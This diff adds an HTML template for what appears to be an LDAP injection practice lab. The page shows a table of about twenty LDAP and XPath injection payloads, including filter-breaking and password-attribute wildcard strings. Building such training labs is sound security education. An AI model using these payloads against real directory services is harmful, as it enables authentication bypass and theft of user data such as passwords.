@@ -1,0 +1,55 @@
+<html>
+{% extends 'eldap/main.html' %}
+
+{% block content %}
+<style>
+table {
+  font-family: arial, sans-serif;
+  border-collapse: collapse;
+  width: 100%;
+}
+
+td, th {
+  border: 1px solid #dddddd;
+  text-align: left;
+  padding: 8px;
+}
+
+tr:nth-child(even) {
+  background-color: #dddddd;
+}
+</style>
+<div class="row">
+<div class="column">
+  <table>
+  <tr>
+    <th>Payloads</th>
+  </tr>
+      <tr><td>*</td></tr>
+    <tr><td>*)(&</td></tr>
+    <tr><td>*))%00</td></tr>
+    <tr><td>)(cn=))\x00</td></tr>
+    <tr><td>*()|%26'</td></tr>
+    <tr><td>*()|&'</td></tr>
+    <tr><td>*(|(mail=*))</td></tr>
+    <tr><td>*(|(objectclass=*))</td></tr>
+    <tr><td>*)(uid=*))(|(uid=*</td></tr>
+    <tr><td>*/*</td></tr>
+    <tr><td>*|</td></tr>
+    <tr><td>/</td></tr>
+    <tr><td>//</td></tr>
+    <tr><td>//*</td></tr>
+    <tr><td>@*</td></tr>
+    <tr><td>|</td></tr>
+    <tr><td>admin*</td></tr>
+    <tr><td>admin*)((|userpassword=*)</td></tr>
+    <tr><td>admin*)((|userPassword=*)</td></tr>
+    <tr><td>x' or name()='username' or 'x'='y</td></tr>
+</table>
+</div>
+    <p></p>
+    <div style="color: darkgrey"> Developed by @EmreOvunc</div>
+</div>
+
+{% endblock %}
+</html>
